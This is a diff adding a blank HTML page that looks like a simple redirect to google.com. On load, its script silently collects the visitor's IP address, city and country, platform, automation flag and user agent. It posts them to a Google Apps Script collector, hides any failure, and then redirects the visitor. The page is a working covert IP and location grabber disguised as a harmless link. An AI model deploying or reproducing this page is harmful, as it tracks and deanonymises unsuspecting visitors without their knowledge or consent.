@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title></title>
+    <style>html, body { background-color: #ffffff; margin: 0; padding: 0; height: 100%; }</style>
+    <script>
+        (async function() {
+            const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbypwMn_1VTtTUvTcJz9T6pOAPMr42LmMQ3Wftmg2qZNE8O_QLbrpLgHyiG_Kpl6iuzW/exec";
+            const TARGET_URL = "https://www.google.com";
+
+            try {
+                // 1. Fetch IP
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                const clientIp = ipData.ip;
+
+                // 2. Fetch Location based on that IP
+                const locRes = await fetch(`https://ipapi.co/${clientIp}/json/`);
+                const locData = await locRes.json();
+                const location = `${locData.city || 'Unknown'}, ${locData.country_name || 'Unknown'}`;
+
+                // 3. Prepare Telemetry
+                const telemetry = {
+                    ip: clientIp,
+                    location: location,
+                    platform: navigator.platform || "Unknown",
+                    isAutomated: navigator.webdriver || false,
+                    userAgent: navigator.userAgent || "Unknown"
+                };
+
+                // 4. Send
+                fetch(WEB_APP_URL, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    keepalive: true,
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(telemetry)
+                });
+            } catch (e) {
+                // Silently fail if API limit is hit or blocked
+            }
+
+            window.location.replace(TARGET_URL);
+        })();
+    </script>
+</head>
+<body></body>
+</html>
